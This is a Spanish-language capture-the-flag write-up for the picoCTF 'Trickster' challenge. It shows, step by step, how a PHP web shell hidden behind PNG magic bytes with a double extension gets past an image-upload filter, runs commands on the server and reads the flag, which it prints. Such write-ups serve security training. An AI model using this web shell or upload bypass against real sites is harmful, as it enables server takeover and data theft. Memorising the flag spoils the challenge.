# Trickster
# Descripción del reto:
I found a web app that can help process images: PNG images only! Try it here! http://atlas.picoctf.net:57911/
# Solución:
curl -s http://atlas.picoctf.net:57911/robots.txt
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/

curl -s http://atlas.picoctf.net:57911/instructions.txt
# (Las instrucciones revelan que el servidor solo valida que el nombre contenga ".png" y que el archivo inicie con los magic bytes "PNG").

echo -e "PNG\n<?php system(\$_GET['cmd']); ?>" > shell.png.php
curl -i -s -X POST -F "file=@shell.png.php" http://atlas.picoctf.net:57911/

curl -s "http://atlas.picoctf.net:57911/uploads/shell.png.php?cmd=ls%20-la%20../" | grep "\.txt"
-rw-r--r-- 1 root     root       49 Mar 12  2024 GAZWIMLEGU2DQ.txt
-rw-r--r-- 1 root     root      415 Feb  7  2024 instructions.txt
-rw-r--r-- 1 root     root       62 Feb  7  2024 robots.txt

curl -s "http://atlas.picoctf.net:57911/uploads/shell.png.php?cmd=cat%20../GAZWIMLEGU2DQ.txt"
PNG
/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548} */

'picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548}'
# Notas adicionales
Vulnerabilidad de subida de archivos (File Upload). Se evadió la débil validación del servidor creando un archivo "políglota" (shell.png.php). Al contener "PNG" al inicio, pasó el filtro de magic bytes, y al tener ".png" en el nombre, pasó el filtro de extensión, pero el servidor terminó ejecutándolo como PHP, dándonos una web shell para leer archivos del sistema.
# Referencias